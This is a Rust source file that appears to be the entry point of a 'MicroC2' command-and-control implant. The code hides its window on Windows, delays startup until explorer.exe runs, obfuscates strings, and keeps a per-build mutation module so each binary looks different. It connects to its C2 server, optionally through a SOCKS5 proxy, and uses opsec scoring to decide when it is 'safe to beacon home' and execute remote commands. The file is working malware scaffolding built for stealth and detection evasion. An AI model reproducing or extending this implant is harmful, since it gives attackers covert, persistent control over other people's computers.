#![cfg_attr(
    all(target_os = "windows", not(debug_assertions)),
    windows_subsystem = "windows"
)]

use agent::auth::AgentAuth;

use log::{debug, error, info};
use std::env;
use std::sync::Arc;
use std::time::Duration;

// Helper function to get current timestamp
#[cfg(target_os = "windows")]
fn now_timestamp() -> std::time::Instant {
    std::time::Instant::now()
}

// Dormant startup function
// This function is called on Windows to wait for the system to be idle before starting the agent
// It checks for the presence of explorer.exe and waits for up to 10 minutes
#[cfg(target_os = "windows")]
fn dormant_startup() {
    use obfstr::obfstr;
    use std::ffi::OsStr;
    use sysinfo::{RefreshKind, System};

    let mut sys = System::new_with_specifics(RefreshKind::everything());
    let start = now_timestamp();
    // Wait up to 10 minutes or until explorer.exe is running
    while start.elapsed().as_secs() < 600 {
        sys.refresh_specifics(RefreshKind::everything());
        if sys
            .processes_by_name(OsStr::new(obfstr!("explorer.exe")))
            .next()
            .is_some()
        {
            break;
        }
        std::thread::sleep(std::time::Duration::from_secs(5));
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    dormant_startup();

    env_logger::init();
    info!("[STARTUP] MicroC2 Agent starting...");

    // Reference the seed-derived mutation module once so LLVM cannot strip it.
    std::hint::black_box(agent::mutation::mutation_entry());
    debug!(
        "[MUTATION] Build mutation seed: {}",
        env!("MUTATION_SEED_USED")
    );

    let config = agent::config::AgentConfig::load()?;
    info!("[CONFIG] Loaded agent config: {:?}", config);

    if config.socks5_enabled {
        info!(
            "[CONFIG] Outbound SOCKS5 proxy enabled at {}:{}",
            config.socks5_host, config.socks5_port
        );
    } else {
        info!("[CONFIG] Outbound SOCKS5 proxy disabled; using direct C2 connections");
    }

    if env::args_os().nth(1).is_some() {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            "runtime C2 URL overrides are disabled; rebuild the payload for a different listener",
        )
        .into());
    }
    let server_addr = config
        .get_validated_server_url()
        .map_err(|err| std::io::Error::new(std::io::ErrorKind::InvalidInput, err))?
        .to_string();

    let agent_id = agent::identity::resolve_runtime_agent_id(&config)?;
    let auth = Arc::new(AgentAuth::for_runtime(&config, &agent_id)?);
    info!("[INFO] Payload ID: {}", config.payload_id);
    info!("[INFO] Agent ID: {}", agent_id);

    info!("[AGENT] Starting main loop. Agent ID: {}", agent_id);

    // --- Initial Opsec Check Loop (before first agent_loop call) ---
    loop {
        let current_mode = agent::opsec::determine_agent_mode(&config);
        match current_mode {
            agent::opsec::AgentMode::BackgroundOpsec => {
                info!("[OPSEC] Safe to beacon home. Starting agent.");
                break; // Exit this loop to start agent_loop
            }
            agent::opsec::AgentMode::ReducedActivity => {
                info!("[OPSEC] Moderately high score. Entering ReducedActivity mode. Attempting heartbeat then sleeping longer.");

                if let Err(e) = agent::commands::command_shell::send_heartbeat_with_client(
                    &config,
                    &server_addr,
                    &agent_id,
                    &auth,
                )
                .await
                {
                    error!("[OPSEC] Heartbeat failed in ReducedActivity (initial loop): {}. C2 failure counter updated internally.", e);
                } else {
                    info!("[OPSEC] Heartbeat successful in ReducedActivity (initial loop).");
                }

                std::thread::sleep(Duration::from_secs(config.reduced_activity_sleep_secs));
            }
            agent::opsec::AgentMode::FullOpsec => {
                info!("[OPSEC] Not safe to beacon home. Staying in FullOpsec (encrypted and dormant).");
                std::thread::sleep(Duration::from_secs(5)); // Short sleep, rely on score decay/cooldown
            }
        }
    }
    // --- End Initial Opsec Check Loop ---

    // --- Main Agent Execution Loop ---
    loop {
        // agent_loop handles C2 comms and command execution
        if let Err(e) =
            agent::commands::command_shell::agent_loop(&server_addr, &agent_id, auth.clone()).await
        {
            error!(
                "[ERROR] Agent loop error: {}. Preparing to re-assess OPSEC state.",
                e
            );
            // Don't immediately exit; re-assess below
        }

        info!("[OPSEC] Returned from agent_loop or error occurred. Re-assessing OPSEC state...");

        // Re-assessment Loop (similar to initial check)
        loop {
            let current_mode = agent::opsec::determine_agent_mode(&config);
            match current_mode {
                agent::opsec::AgentMode::BackgroundOpsec => {
                    info!("[OPSEC] Safe to beacon home again. Resuming agent_loop.");
                    break; // Exit re-assessment loop, main loop will call agent_loop again
                }
                agent::opsec::AgentMode::ReducedActivity => {
                    info!("[OPSEC] Moderately high score. Entering ReducedActivity mode. Attempting heartbeat then sleeping longer.");

                    if let Err(e) = agent::commands::command_shell::send_heartbeat_with_client(
                        &config,
                        &server_addr,
                        &agent_id,
                        &auth,
                    )
                    .await
                    {
                        error!("[OPSEC] Heartbeat failed in ReducedActivity (re-assessment loop): {}. C2 failure counter updated internally.", e);
                    } else {
                        info!(
                            "[OPSEC] Heartbeat successful in ReducedActivity (re-assessment loop)."
                        );
                    }

                    std::thread::sleep(Duration::from_secs(config.reduced_activity_sleep_secs));
                }
                agent::opsec::AgentMode::FullOpsec => {
                    info!("[OPSEC] Not safe to beacon home. Staying in FullOpsec (encrypted and dormant).");
                    std::thread::sleep(Duration::from_secs(5)); // Short sleep, rely on score decay/cooldown
                }
            }
        }
    }
}
